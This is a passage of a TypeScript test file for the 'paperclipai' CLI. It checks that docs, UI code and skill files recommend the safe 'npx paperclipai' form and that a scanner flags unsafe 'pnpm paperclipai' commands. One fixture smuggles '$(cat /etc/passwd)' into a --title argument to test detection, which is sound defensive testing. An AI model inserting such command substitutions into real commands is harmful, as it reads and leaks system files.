    expect(source).toContain("fileURLToPath(import.meta.url)");
    expect(source).toContain('path.join(cliRoot, "src", "index.ts")');
    expect(source).toContain("env-lab down");
    // The bare `pnpm paperclipai` script form is unsafe. Do not restore it.
    expect(source).not.toContain("pnpm paperclipai env-lab");
    // `pnpm exec paperclipai` does not resolve the CLI binary. Do not use it.
    expect(source).not.toContain("pnpm exec paperclipai env-lab");
    // The CWD-relative form breaks from a checkout subdirectory. Do not restore it.
    expect(source).not.toContain(
      "node cli/node_modules/tsx/dist/cli.mjs cli/src/index.ts env-lab down",
    );
  });

  it("emits the bootstrap fallback command from the UI", () => {
    const source = read("ui/src/bootstrapSetup.ts");
    expect(source).toContain("npx paperclipai auth bootstrap-ceo");
    expect(source).not.toContain("pnpm paperclipai auth bootstrap-ceo");
    expect(source).not.toContain("pnpm exec paperclipai auth bootstrap-ceo");
  });

  it("emits the setup form from the board skill", () => {
    const source = read("skills/paperclip-board/SKILL.md");
    expect(source).toContain("npx paperclipai board setup");
    expect(source).not.toContain("pnpm paperclipai board setup");
    expect(source).not.toContain("pnpm exec paperclipai board setup");
  });

  // ── The safe-invocation note ─────────────────────────────────────────────

  it("documents the safe form in doc/CLI.md", () => {
    const cli = read("doc/CLI.md");
    expect(cli).toContain("Security: safe invocation for content-bearing arguments");
    expect(cli).toContain("npx paperclipai");
    expect(cli).toContain("inert `argv`");
    // The policy section states the exact-allowlist rule.
    expect(cli).toContain("allowlist entry is an offender");
  });

  it("documents offline and air-gapped use with a safe cache-only form", () => {
    const cli = read("doc/CLI.md");
    const subsection = extractOfflineSubsection(cli);
    // The offline subsection must exist and must name the cache-only safe form.
    expect(subsection).toContain("### Offline and air-gapped use");
    expect(subsection).toContain("npx --offline paperclipai");
    // The offline subsection must not present `pnpm paperclipai` or
    // `pnpm exec paperclipai` as a safe or offline form. Only a warning line
    // may name `pnpm paperclipai`, and it must tell the reader not to use it.
    for (const line of subsection.split("\n")) {
      expect(line).not.toContain("pnpm exec paperclipai");
      if (line.includes("pnpm paperclipai")) {
        expect(line.toLowerCase()).toContain("do not use");
      }
    }
  });

  it("documents the safe form in the agent-facing skill", () => {
    const skill = read("skills/paperclip/SKILL.md");
    expect(skill).toContain("CLI safety");
    expect(skill).toContain("npx paperclipai");
    expect(skill).toContain("Do not use `pnpm paperclipai`");
  });

  // ── Backslash line continuation ──────────────────────────────────────────

  it("flags a content-bearing pnpm paperclipai command split across continued lines", () => {
    const source = [
      "```sh",
      "pnpm paperclipai issue create \\",
      '  --company-id <company-id> \\',
      '  --title "$(cat /etc/passwd)"',
      "```",
    ].join("\n");
    const offenders = scanText("doc/EXAMPLE.md", source);
    expect(offenders).toHaveLength(1);
    // The report points to the first physical line of the command.
    expect(offenders[0]).toContain("doc/EXAMPLE.md:2:");
  });

  it("flags a continued command whose only content-bearing flag sits on the last line", () => {
    const source = [
      "pnpm paperclipai worktree init \\",
      "  --force \\",
      "  --name PAP-000-example",
    ].join("\n");
    const offenders = scanText("doc/EXAMPLE.md", source);
    expect(offenders).toHaveLength(1);
    expect(offenders[0]).toContain("doc/EXAMPLE.md:1:");
    expect(offenders[0]).toContain("--name");
  });

  it("does not flag a continued npx paperclipai command", () => {
    const source = [
      "npx paperclipai issue create \\",
      "  --company-id <company-id> \\",
      '  --title "Investigate checkout conflict"',
    ].join("\n");
    expect(scanText("doc/EXAMPLE.md", source)).toEqual([]);
  });

  it("does not flag a continued pnpm paperclipai command that stays on the allowlist", () => {
    const source = [
      "pnpm paperclipai env-lab \\",
      "  status \\",
      "  --json",
    ].join("\n");
    expect(scanText("doc/EXAMPLE.md", source)).toEqual([]);
  });

  it("flags a recommended pnpm exec paperclipai line but skips a warning line", () => {
    expect(recommendsBrokenExecForm("Run pnpm exec paperclipai issue create --title x")).toBe(true);
    expect(
      recommendsBrokenExecForm("`pnpm exec paperclipai <command> <args>` — broken. Do not use it."),
    ).toBe(false);
  });
});
